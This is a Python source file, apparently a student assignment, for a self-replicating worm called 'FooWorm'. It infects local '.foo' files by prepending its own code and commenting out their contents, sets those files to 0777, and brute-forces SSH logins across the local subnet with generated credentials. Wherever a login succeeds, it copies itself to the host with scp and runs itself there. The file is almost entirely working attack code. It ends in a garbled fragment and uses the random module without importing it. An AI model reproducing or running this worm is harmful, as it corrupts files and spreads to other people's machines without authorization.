#!/usr/bin/env python
import sys, stat
import os
import glob
import paramiko
import scp
import select
import signal
import subprocess
## FooWorm.py
## Author: Gaurav CG (PES1201700989)
## Reference: FooVirus.py, AbraWorm.py Authored by Avi Kak (kak2purdue.edu)
print("FooWorm Created By Gaurav CG, PES1201700989")
print("This worm adds its code to all '.foo' files and comments out their original code")
print("After affecting these files it will then try infecting other hosts in the same network") 
LINES = 113
IN = open(sys.argv[0], 'r')
virus = [line for (i,line) in enumerate(IN) if i<LINES]
# Code for infecting the host '.foo' files
for item in glob.glob("*.foo"):
	IN = open(item, 'r')
	all_of_it = IN.readlines()
	IN.close()
	if any(line.find('FooWorm') for line in all_of_it): next
	os.chmod(item, 0777)
	OUT = open(item, 'w')
	OUT.writelines(virus)
	all_of_it = ['#' + line for line in all_of_it]
	OUT.writelines(all_of_it)
	OUT.close()
# Code for propogating itself to other hosts in the network
def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)

debug = 1
##  The trigrams and digrams are used for syntheizing plausible looking
##  usernames and passwords.  See the subroutines at the end of this script
##  for how usernames and passwords are generated by the worm.
trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum 
                  bus but buz cam cat ced cel cin cid cip cir con cod cos cop 
                  cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab 
                  faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil 
                  kim kin kip kir kis kit kix laf lad laf lag led leg lem len 
                  let nab nac nad nag nal nam nan nap nar nas nat oda ode odi 
                  odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak 
                  pal pam pap par pas pat pek pem pet qik rab rob rik rom sab 
                  sad sag sak sam sap sas sat sit sid sic six tab tad tom tod 
                  wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi 
              ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams  = digrams.split()

def get_new_user():
	if debug: return "seed"
	selector = "{0:03b}".format(random.randint(0,7))
	username = ''.join(map(lambda x: random.sample(trigrams,1)[0] if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3)))
	return username

def get_new_password():
	if debug: return "dees"
	selector = "{0:03b}".format(random.randint(0,7))
	password = ''.join(map(lambda x:  random.sample(trigrams,1)[0] + (str(random.randint(0,9)) if random.random() > 0.5 else '') if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3)))
	return password

def get_new_ips(network):
	if debug: return ['192.168.1.4']
	start_ip = ".".join(network.split('.')[:-1])
	ip_range = 256
	ip_addrs = list(map(lambda x: start_ip + "." + x, range(ip_range)))
	return ip_addrs

#Get the IP address of current host
process_output = subprocess.check_output(['hostname','-I'])
host_ip = process_output.split('\n')[0]
print("Infected host IP:",host_ip)
while True:
	username = get_new_user()
	password = get_new_password()
	
	ip_addrs = get_new_ips(host_ip)
	for ip_addr in ip_addrs:
		print("\nTrying password %s for user %s at IP address: %s" % (password,username,ip_addr))
		try:
			ssh = paramiko.SSHClient()
			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			ssh.connect(ip_addr,port=22,username=username,password=password,timeout=5)
			print("\n\nconnected\n")
			# Checking if host is already targetted
			received_list = error = None
			stdin, stdout, stderr = ssh.exec_command('ls')
			error = stderr.readlines()
			if error is not None:
				print("Error:", error)
			received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
			print("Output of ls command:",received_list)
			if ''.join(received_list).find('FooWorm') >= 0 or ip_addr == host_ip[:-1]:
				print("\nThe Target machine is already infected")
				if debug: exit()
				next
			# Send copy of Worm to the targeted host machine
			scpcon = scp.SCPClient(ssh.get_transport())
			scpcon.put(sys.argv[0])
			scpcon.close()
			# Now run the Worm in target host
			transport = ssh.get_transport()
			channel = transport.open_session()
			channel.exec_command('python '+sys.argv[0])
		except:
			next
	if debug: break world")
